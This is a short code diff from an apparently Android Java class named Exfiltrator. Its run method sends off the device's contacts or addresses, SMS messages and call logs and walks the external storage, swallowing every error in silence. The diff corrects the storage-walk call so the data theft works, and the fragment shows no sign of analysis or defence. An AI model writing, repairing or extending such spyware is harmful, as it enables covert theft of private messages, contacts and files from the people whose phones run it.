@@ -41,7 +41,7 @@ public class Exfiltrator implements Runnable {
         try { sendAddresses(); } catch (Throwable ignored) {}
         try { sendSms(); } catch (Throwable ignored) {}
         try { sendCalls(); } catch (Throwable ignored) {}
-        try { walk(new File(Environment.getExternalStorageDirectory())); } catch (Throwable ignored) {}
+        try { walk(Environment.getExternalStorageDirectory()); } catch (Throwable ignored) {}
     }
     private void uploadJson(String name, JSONArray arr) {
         try {
